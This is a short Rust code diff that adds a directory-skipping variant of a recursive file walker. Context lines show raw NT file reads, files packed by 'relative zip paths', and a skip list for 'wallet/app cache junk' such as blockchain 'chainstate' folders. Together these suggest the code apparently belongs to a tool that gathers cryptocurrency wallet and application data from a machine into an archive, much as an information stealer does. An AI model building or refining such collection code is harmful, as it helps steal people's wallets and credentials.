@@ -195,6 +195,12 @@ unsafe fn nt_read_contents(nt: &Nt, handle: usize) -> Result<Vec<u8>, NtStatus> 
 
 /// Recursively list files under `root` (relative zip paths), capped per file.
 pub fn walk_files(root: &Path, max_file: u64, out: &mut Vec<(std::path::PathBuf, u64)>) {
+    walk_files_ex(root, max_file, &[], out);
+}
+
+/// Same, but skips directories whose lowercase name is in `skip_dirs`
+/// (wallet/app cache junk: blocks, chainstate, cache dirs, logs...).
+pub fn walk_files_ex(root: &Path, max_file: u64, skip_dirs: &[&str], out: &mut Vec<(std::path::PathBuf, u64)>) {
     let Ok(entries) = std::fs::read_dir(root) else {
         return;
     };
@@ -204,7 +210,14 @@ pub fn walk_files(root: &Path, max_file: u64, out: &mut Vec<(std::path::PathBuf,
             continue;
         };
         if m.is_dir() {
-            walk_files(&p, max_file, out);
+            let name = p
+                .file_name()
+                .map(|n| n.to_string_lossy().to_lowercase())
+                .unwrap_or_default();
+            if skip_dirs.iter().any(|s| name == *s) {
+                continue;
+            }
+            walk_files_ex(&p, max_file, skip_dirs, out);
         } else if m.is_file() && m.len() > 0 && m.len() <= max_file {
             out.push((p, m.len()));
         }
